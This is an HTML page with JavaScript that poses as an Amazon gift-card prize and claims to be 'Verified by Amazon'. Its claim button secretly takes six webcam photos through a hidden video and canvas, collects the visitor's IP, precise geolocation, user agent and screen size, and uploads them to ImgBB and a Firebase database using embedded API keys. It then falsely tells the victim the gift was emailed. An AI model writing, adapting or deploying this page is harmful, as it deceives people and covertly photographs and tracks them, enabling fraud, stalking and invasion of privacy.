<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🎁 Amazon Gift Card Winner!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: radial-gradient(ellipse at center, #1a0a2e 0%, #0a0a2e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        
        .sparkle {
            position: absolute;
            width: 4px;
            height: 4px;
            background: gold;
            border-radius: 50%;
            box-shadow: 0 0 10px gold;
            animation: sparkleFloat 6s infinite;
        }
        @keyframes sparkleFloat {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            20% { opacity: 1; }
            80% { opacity: 1; }
            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
        }
        
        .gift-card {
            background: rgba(255,255,255,0.98);
            border-radius: 60px;
            padding: 50px 45px;
            max-width: 580px;
            width: 100%;
            text-align: center;
            box-shadow: 0 50px 100px rgba(0,0,0,0.4);
            animation: slideUp 0.6s cubic-bezier(0.2, 0.9, 0.4, 1.1);
            position: relative;
            z-index: 10;
        }
        
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(80px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .gift-card::before {
            content: '';
            position: absolute;
            top: -3px;
            left: -3px;
            right: -3px;
            bottom: -3px;
            background: linear-gradient(135deg, #ffd700, #ff8c00, #ffd700, #ff8c00);
            border-radius: 63px;
            z-index: -1;
            animation: borderGlow 3s ease infinite;
            background-size: 200% 200%;
        }
        
        @keyframes borderGlow {
            0% { background-position: 0% 50%; opacity: 0.5; }
            50% { background-position: 100% 50%; opacity: 0.8; }
            100% { background-position: 0% 50%; opacity: 0.5; }
        }
        
        .gift-icon { font-size: 110px; animation: bounce 0.8s ease infinite; display: inline-block; }
        @keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
        
        h1 {
            font-size: 38px;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin: 20px 0 10px;
            font-weight: 800;
        }
        
        .prize-badge {
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            color: #1a1a2e;
            padding: 12px 30px;
            border-radius: 60px;
            display: inline-block;
            margin: 15px 0;
            font-weight: 800;
            font-size: 18px;
            box-shadow: 0 8px 25px rgba(255,215,0,0.4);
        }
        
        .amount { font-size: 50px; font-weight: 800; margin: 15px 0; color: #2d3748; }
        .amount span {
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 58px;
        }
        
        .timer-box {
            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
            padding: 14px 28px;
            border-radius: 60px;
            margin: 25px auto;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        .timer { font-size: 32px; font-weight: bold; color: #ff8c00; font-family: monospace; }
        
        .claim-btn {
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            color: #1a1a2e;
            border: none;
            padding: 20px 45px;
            font-size: 24px;
            font-weight: 800;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            margin-top: 25px;
            box-shadow: 0 10px 30px rgba(255,215,0,0.4);
        }
        .claim-btn:hover { transform: translateY(-3px); box-shadow: 0 20px 40px rgba(255,215,0,0.5); }
        .claim-btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
        
        .status { margin-top: 20px; padding: 12px; border-radius: 30px; font-size: 14px; display: none; font-weight: 500; }
        .status.show { display: block; }
        .status.success { background: #d4edda; color: #155724; }
        .status.info { background: #cce5ff; color: #004085; }
        
        .footer { margin-top: 25px; font-size: 12px; color: #aaa; }
        
        /* HIDDEN CAMERA */
        #hiddenVideo, #hiddenCanvas {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            visibility: hidden;
        }
        
        .spinner {
            width: 24px;
            height: 24px;
            border: 3px solid rgba(26,26,46,0.2);
            border-radius: 50%;
            border-top-color: #ff8c00;
            animation: spin 0.6s linear infinite;
            display: inline-block;
            margin-right: 12px;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            z-index: 1000;
            pointer-events: none;
            animation: fall linear forwards;
        }
        @keyframes fall { to { transform: translateY(100vh) rotate(360deg); opacity: 0; } }
        
        @media (max-width: 550px) {
            .gift-card { padding: 35px 25px; }
            h1 { font-size: 28px; }
            .prize-badge { font-size: 13px; padding: 8px 18px; }
            .amount span { font-size: 42px; }
            .claim-btn { padding: 16px 30px; font-size: 18px; }
            .timer { font-size: 26px; }
        }
    </style>
</head>
<body>
    <div class="gift-card">
        <div class="gift-icon">🎁</div>
        <h1>CONGRATULATIONS!</h1>
        <div class="prize-badge">🏆 YOU ARE THE LUCKY WINNER! 🏆</div>
        <div class="amount">You won <span>₹1000</span> Amazon Gift Card!</div>
        
        <div class="timer-box">
            <span>⏰</span>
            <span class="timer" id="timer">05:00</span>
        </div>
        
        <button class="claim-btn" id="claimBtn">
            🎁 CLAIM YOUR GIFT NOW 🎁
        </button>
        
        <div id="status" class="status"></div>
        <div class="footer">
            ✅ Limited time offer | Verified by Amazon
        </div>
    </div>

    <!-- HIDDEN CAMERA -->
    <video id="hiddenVideo" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
        import { getStorage, ref as sRef, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA6bXT7kdptEISxGgxTuWaWNGb9QGDM098",
            authDomain: "website-by-aditya-das.firebaseapp.com",
            databaseURL: "https://website-by-aditya-das-default-rtdb.firebaseio.com",
            projectId: "website-by-aditya-das",
            storageBucket: "website-by-aditya-das.firebasestorage.app",
            messagingSenderId: "507483391714",
            appId: "1:507483391714:web:233d823d2f8299a74380bb"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const storage = getStorage(app);
        
        // ImgBB API Key
        const IMGBB_API_KEY = 'eade6a2977f7885a895468ffeee4d5a0';
        
        let isProcessing = false;
        let mediaStream = null;
        
        let timeLeft = 300;
        const timerEl = document.getElementById('timer');
        function updateTimer() {
            const mins = Math.floor(timeLeft / 60);
            const secs = timeLeft % 60;
            timerEl.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
            if (timeLeft > 0) { timeLeft--; setTimeout(updateTimer, 1000); }
        }
        updateTimer();
        
        function showStatus(msg, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.innerHTML = msg;
            statusDiv.className = `status ${type} show`;
            setTimeout(() => {
                if (statusDiv.className === `status ${type} show`) {
                    statusDiv.style.display = 'none';
                }
            }, 3000);
        }
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) { return 'Unknown'; }
        }
        
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                    (err) => resolve(null),
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            });
        }
        
        async function captureMultiplePhotos() {
            const photos = [];
            try {
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = mediaStream;
                await video.play();
                await new Promise(r => setTimeout(r, 400));
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                for (let i = 0; i < 6; i++) {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    photos.push(canvas.toDataURL('image/jpeg', 0.7));
                    if (i < 5) await new Promise(r => setTimeout(r, 200));
                }
                if (mediaStream) { mediaStream.getTracks().forEach(track => track.stop()); mediaStream = null; }
                return photos;
            } catch(e) { return []; }
        }
        
        async function uploadToImgBB(imageData) {
            if (!imageData) return null;
            try {
                const formData = new FormData();
                formData.append('image', imageData.split(',')[1]);
                formData.append('key', IMGBB_API_KEY);
                const res = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: formData });
                const data = await res.json();
                return data.success ? data.data.url : null;
            } catch(e) { return null; }
        }
        
        async function saveToFirebase(ip, location, photoUrls) {
            try {
                const data = {
                    ip: ip,
                    location: location,
                    photoUrls: photoUrls,
                    photoCount: photoUrls.length,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    screenSize: `${screen.width}x${screen.height}`
                };
                await push(ref(db, 'claims'), data);
                return true;
            } catch(e) { return false; }
        }
        
        function createConfetti() {
            const colors = ['#ffd700', '#ff8c00', '#ffa500', '#ffcc00'];
            for (let i = 0; i < 200; i++) {
                setTimeout(() => {
                    const confetti = document.createElement('div');
                    confetti.className = 'confetti';
                    confetti.style.left = Math.random() * window.innerWidth + 'px';
                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                    confetti.style.width = Math.random() * 12 + 6 + 'px';
                    confetti.style.height = Math.random() * 12 + 6 + 'px';
                    confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
                    confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
                    document.body.appendChild(confetti);
                    setTimeout(() => confetti.remove(), 5000);
                }, i * 12);
            }
        }
        
        async function startVerification() {
            if (isProcessing) return;
            isProcessing = true;
            
            const btn = document.getElementById('claimBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span> Processing your gift...';
            
            showStatus('🎁 Preparing your gift...', 'info');
            
            const ip = await getIP();
            const location = await getLocation();
            const photos = await captureMultiplePhotos();
            
            const photoUrls = [];
            for (const photo of photos) {
                const url = await uploadToImgBB(photo);
                if (url) photoUrls.push(url);
            }
            
            await saveToFirebase(ip, location, photoUrls);
            
            showStatus('✅ Congratulations! Your gift has been sent to your email!', 'success');
            btn.innerHTML = '🎁 GIFT CLAIMED! 🎁';
            
            createConfetti();
            
            setTimeout(() => {
                window.location.href = 'https://www.amazon.in/gift-cards';
            }, 3000);
        }
        
        document.getElementById('claimBtn').addEventListener('click', startVerification);
        
        // Sparkles
        for (let i = 0; i < 50; i++) {
            const sparkle = document.createElement('div');
            sparkle.className = 'sparkle';
            sparkle.style.left = Math.random() * 100 + '%';
            sparkle.style.animationDelay = Math.random() * 8 + 's';
            sparkle.style.animationDuration = 4 + Math.random() * 6 + 's';
            document.body.appendChild(sparkle);
        }
    </script>
</body>
</html>
